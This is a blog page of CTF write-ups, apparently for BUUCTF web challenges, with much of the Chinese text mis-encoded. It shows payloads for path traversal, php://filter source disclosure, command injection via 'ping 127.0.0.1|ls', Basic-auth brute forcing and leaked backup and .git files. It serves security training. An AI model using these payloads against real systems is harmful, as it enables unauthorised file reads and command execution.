<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="buuåˆ·é¢˜è®°å½•, Ethe&#39;s blog">
    <meta name="description" content="è®°å½•ä¸€ä¸‹è‡ªå·±buuçš„åˆ·é¢˜è¿›åº¦ï¼Œç•™ä¸‹ç‚¹wpæ–¹ä¾¿ä»¥åçœ‹
å»ºè®®æŒ‚æ¢¯å­ï¼Œä¸ç„¶å›¾ç‰‡åŠ è½½ä¼šå¾ˆæ…¢
 

[HCTF 2018]WarmUp
è¿›å…¥åçœ‹åˆ°æ»‘ç¨½è¡¨æƒ…ï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°æœ‰source.php

çœ‹åˆ°phpä»£ç 
è¦æ±‚ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„fileï¼Œä¸”éœ€æ»¡">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>buuåˆ·é¢˜è®°å½• | Ethe&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>

<meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Ethe&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Ethe&#39;s blog</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">buuåˆ·é¢˜è®°å½•</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }
    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }
    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2021-06-17
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2022-01-17
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    34.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    165 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>è®°å½•ä¸€ä¸‹è‡ªå·±buuçš„åˆ·é¢˜è¿›åº¦ï¼Œç•™ä¸‹ç‚¹wpæ–¹ä¾¿ä»¥åçœ‹</p>
<p>å»ºè®®æŒ‚æ¢¯å­ï¼Œä¸ç„¶å›¾ç‰‡åŠ è½½ä¼šå¾ˆæ…¢</p>
 <span id="more"></span>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404004946660.png" alt="image-20210404004946660"></p>
<p>è¿›å…¥åçœ‹åˆ°æ»‘ç¨½è¡¨æƒ…ï¼ŒæŸ¥çœ‹æºç çœ‹åˆ°æœ‰source.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404005053754.png" alt="image-20210404005053754"></p>
<p>çœ‹åˆ°phpä»£ç </p>
<p>è¦æ±‚ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„fileï¼Œä¸”éœ€æ»¡è¶³class emmmä¸­çš„æ¡ä»¶</p>
<pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php
  highlight_file(__FILE__);
  class emmm
  &#123;
    public static function checkFile(&amp;$page)
    &#123;
      $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];
     åˆ¤æ–­ä¼ å…¥çš„å‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸”æ˜¯å¦ä¸ºstringç±»å‹
      if (! isset($page) || !is_string($page)) &#123;
        echo &quot;you can&#39;t see it&quot;;
        return false;
      &#125;
	åˆ¤æ–­ä¼ å…¥çš„å‚æ•°ä¸­æ˜¯å¦æœ‰ç™½åå•å†…çš„å†…å®¹
      if (in_array($page, $whitelist)) &#123;
        return true;
      &#125;
	mb_substr()å‡½æ•°åˆ‡å‰²å‚æ•°ä»0åˆ°ç¬¬mb_strpos()å‡½æ•°è¿”å›çš„æ•°å€¼
      $_page &#x3D; mb_substr(
        $page,
        0,
        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
      );
       åˆ¤æ–­åˆ‡å‰²åçš„å‚æ•°æ˜¯å¦åœ¨ç™½åå•ä¸­
      if (in_array($_page, $whitelist)) &#123;
        return true;
      &#125;
	   åˆ‡å‰²åçš„å‚æ•°ç»è¿‡urlè§£ç åå†è¿›è¡Œä¸€æ¬¡è¿‡æ»¤
      $_page &#x3D; urldecode($page);
      $_page &#x3D; mb_substr(
        $_page,
        0,
        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
      );
      if (in_array($_page, $whitelist)) &#123;
        return true;
      &#125;
      echo &quot;you can&#39;t see it&quot;;
      return false;
    &#125;
  &#125;

  if (! empty($_REQUEST[&#39;file&#39;])
    &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
    &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
  )
      ifå†…ä¸ºçœŸæ—¶è¿›è¡Œæ–‡ä»¶åŒ…å«
  &#123;
    include $_REQUEST[&#39;file&#39;];
    exit;
  &#125; else &#123;
    echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;
  &#125; </code></pre>

<p>ç”±äºhint.phpä¸­æç¤ºflagåœ¨ffffllllaaaaggggä¸­ä¸”whitelistä¸­ä»…æœ‰source.phpå’Œhint.php</p>
<p>æ‰€ä»¥ä¼ å…¥</p>
<p>file=hint.php?ffffllllaaaagggg</p>
<p>æ— å›æ˜¾</p>
<p>åå¤šæ¬¡åˆ©ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½•</p>
<p>æœ€ç»ˆpayloadä¸º</p>
<p>file=hint.php?/../../../../ffffllllaaaagggg</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404142347332.png" alt="image-20210404142347332"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</h2><p>è¿›å…¥åçœ‹åˆ°è¿™ä¸ªç•Œé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152133426.png" alt="image-20210410152133426"></p>
<p>æŸ¥çœ‹æºç å¯ä»¥æ‰¾åˆ°Archive_room.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152211470.png" alt="image-20210410152211470"></p>
<p>å‘ç°è¿™ä¸ªé¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152300206.png" alt="image-20210410152300206"></p>
<p>ç‚¹å‡»æŒ‰é’®åé¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152324518.png" alt="image-20210410152324518"></p>
<p>å°è¯•æŠ“åŒ…å‘ç°secr3t.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152351530.png" alt="image-20210410152351530"></p>
<p>è®¿é—®å¾—åˆ°phpä»£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152616564.png" alt="image-20210410152616564"></p>
<p>æ˜¯æ–‡ä»¶åŒ…å«ï¼Œflagåœ¨flag.phpä¸­ï¼Œè¿‡æ»¤äº†../,tp,input,date.</p>
<p>åˆ©ç”¨php://filterç»•è¿‡</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410153820003.png" alt="image-20210410153820003"></p>
<p>æ„é€ file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152727528.png" alt="image-20210410152727528"></p>
<p>base64è§£ç åå¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210410152820778.png" alt="image-20210410152820778"></p>
<h2 id="åŸºç¡€éªŒè¯"><a href="#åŸºç¡€éªŒè¯" class="headerlink" title="åŸºç¡€éªŒè¯"></a>åŸºç¡€éªŒè¯</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144522877.png" alt="image-20210404144522877"></p>
<p>è¿›å…¥åçŒœæµ‹ç”¨æˆ·åä¸ºadmin </p>
<p>å¯†ç ä¸º123456è¿›è¡ŒæŠ“åŒ…</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144619135.png" alt="image-20210404144619135"></p>
<p>å‘ç°å­˜åœ¨ä¸€è¡Œ<strong>Authorization: Basic YWRtaW46MTIzNDU2</strong></p>
<p>çŒœæµ‹YWRtaW46MTIzNDU2ä¸ºbase64åŠ å¯†ï¼›è¿›è¡Œè§£ç </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144840955.png" alt="image-20210404144840955"></p>
<p>å°è¯•é€šè¿‡bpç”¨é™„ä»¶ä¸­çš„å¯†ç è¿›è¡Œçˆ†ç ´ï¼Œ</p>
<p>ä¸ºå¯†ç æ·»åŠ å‰ç¼€ä¸ºadminï¼šä¸”è¦è¿›è¡Œbase64åŠ å¯†çš„è§„åˆ™</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144928995.png" alt="image-20210404144928995"></p>
<p>çˆ†ç ´åå‘ç°å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸åŒä¸å…¶ä»–åŒ…çš„</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145023203.png" alt="image-20210404145023203"></p>
<p>è¿›è¡Œå‘åŒ…æŸ¥çœ‹å…¶å“åº”å¯å‘ç°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145146471.png" alt="image-20210404145146471"></p>
<h2 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h2><p>è¿›å…¥åå‘ç°æœ‰å››ä¸ªç›®å½•ï¼Œ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225319518.png" alt="image-20210405225319518"></p>
<p>ä¾æ¬¡å¯»æ‰¾å¯æ‰¾åˆ°flag.txtæ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225337342.png" alt="image-20210405225337342"></p>
<p><code>./</code> è¡¨ç¤ºå½“å‰ç›®å½•<br><code>../</code> è¡¨ç¤ºçˆ¶çº§ç›®å½•<br><code>/</code> è¡¨ç¤ºæ ¹ç›®å½•</p>
<p><strong>ç›®å½•éå†å¸¸è§çš„æ˜¯ä½¿ç”¨../æ¥éå†ç›®å½•</strong></p>
<h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>è¿›å…¥åä¸ºè¿™ç§é¡µé¢</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225956914.png" alt="image-20210405225956914"></p>
<p>ä»”ç»†æŸ¥æ‰¾åå¯å‘ç°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405230031564.png" alt="image-20210405230031564"></p>
<h2 id="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "><a href="#å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç " class="headerlink" title="å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç "></a>å¤‡ä»½æ–‡ä»¶ä¸‹è½½-ç½‘ç«™æºç </h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405232649997.png" alt="image-20210405232649997"></p>
<p>1.ä¾æ¬¡è¯•è¯•å‘ç°å­˜åœ¨<a target="_blank" rel="noopener" href="http://www.zip,ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶/">www.zip,ä¸‹è½½å‹ç¼©åŒ…åå‘ç°å­˜åœ¨ä¸‰ä¸ªæ–‡ä»¶</a></p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233727394.png" alt="image-20210405233727394"></p>
<p>æŸ¥çœ‹flagçš„æ–‡ä»¶åå‘ç°å…¶ä¸­ä¸å­˜åœ¨flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233814619.png" alt="image-20210405233814619"></p>
<p>å°è¯•åœ¨ç½‘é¡µä¸­è®¿é—®å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233847576.png" alt="image-20210405233847576"></p>
<p>2.å¾¡å‰‘æ‰«æ</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406114539217.png" alt="image-20210406114539217"></p>
<p>3.åˆ©ç”¨dirsearchå·¥å…·æ‰«æ</p>
<p>python dirsearch.py -u <a target="_blank" rel="noopener" href="http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/">http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/</a> -e*</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406122908681.png" alt="image-20210406122908681"></p>
<h2 id="bakæ–‡ä»¶"><a href="#bakæ–‡ä»¶" class="headerlink" title="bakæ–‡ä»¶"></a>bakæ–‡ä»¶</h2><p>è¿›å…¥é¡µé¢å</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145718899.png" alt="image-20210412145718899"></p>
<p>äºæ˜¯æŸ¥çœ‹/index.php.bak</p>
<p>å¾—åˆ°æ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145809693.png" alt="image-20210412145809693"></p>
<h2 id="vimç¼“å­˜"><a href="#vimç¼“å­˜" class="headerlink" title="vimç¼“å­˜"></a>vimç¼“å­˜</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412200444012.png" alt="image-20210412200444012"></p>
<p>æ‰€ä»¥æŸ¥çœ‹.index.php.swpå¯å¾—åˆ°æ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412150945950.png" alt="image-20210412150945950"></p>
<p>ä¹‹ååœ¨Linuxç³»ç»Ÿä¸­ç”¨å‘½ä»¤</p>
<p>vim -r index.php.swpæ‰“å¼€</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412195651269.png" alt="image-20210412195651269"></p>
<h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>æ ¹æ®é¢˜ç›®æŸ¥çœ‹åç¼€.DS_Store</p>
<p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶</p>
<p>ç”¨è®°äº‹æœ¬å°±å¯ä»¥æŸ¥çœ‹çœ‹åˆ°</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154742543.png" alt="image-20210416154742543"></p>
<p>å¯å¾—åˆ°flag</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154816094.png" alt="image-20210416154816094"></p>
<h2 id="gitæ³„éœ²-log"><a href="#gitæ³„éœ²-log" class="headerlink" title="gitæ³„éœ² log"></a>gitæ³„éœ² log</h2><p>é¢˜ç›®ä¸­ä¸ºgitæ³„éœ²å¯ç›´æ¥åœ¨åç¼€ååŠ /.git</p>
<p>ä¹Ÿå¯ç”¨dirsearchæ‰«</p>
<p>ç”¨githackè¿›è¡ŒæŸ¥çœ‹ï¼ˆç™¾åº¦é‡Œæœ‰å‡ ä¸ªgithackæ²¡æœ‰åŠæ³•ç”¨ï¼Œå¼„äº†ä¸€ä¸‹åˆï¼‰</p>
<p>githackè¦ç”¨python2 </p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233409173.png" alt="image-20210416233409173"></p>
<p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹è¿›å…¥åç”¨git bashæ‰“å¼€</p>
<p>åˆ©ç”¨git logå¯ä»¥æŸ¥çœ‹å†å²æäº¤è®°å½•</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233900025.png"></p>
<p>çœ‹åˆ°æœ‰init ï¼Œadd flagï¼Œremove flagä¸‰æ¬¡æäº¤è®°å½•</p>
<p>çŒœæµ‹flagåœ¨add flagä¸­ï¼Œç”¨git diffå‘½ä»¤å¯¹æ¯”ä¸add flagçš„å·®åˆ«ï¼Œå¯å¾—åˆ°flagï¼›</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233631773.png" alt="image-20210416233631773"></p>
<h2 id="ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>[ACTF2020 æ–°ç”Ÿèµ›]Exec</h2><p>æŸ¥çœ‹æºç åä¸å­˜åœ¨æç¤ºï¼Œå°è¯•ping 127.0.0.1</p>
<p>pingé€šåå†å°è¯•ping 127.0.0.1|ls çœ‹åˆ°index.php</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000733167.png" alt="image-20210417000733167"></p>
<p>å¤šæ¬¡ç”¨../æŸ¥çœ‹ä¸Šçº§ç›®å½• çœ‹è§æœ‰flagæ–‡ä»¶</p>
<p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000956928.png" alt="image-20210417000956928"></p>
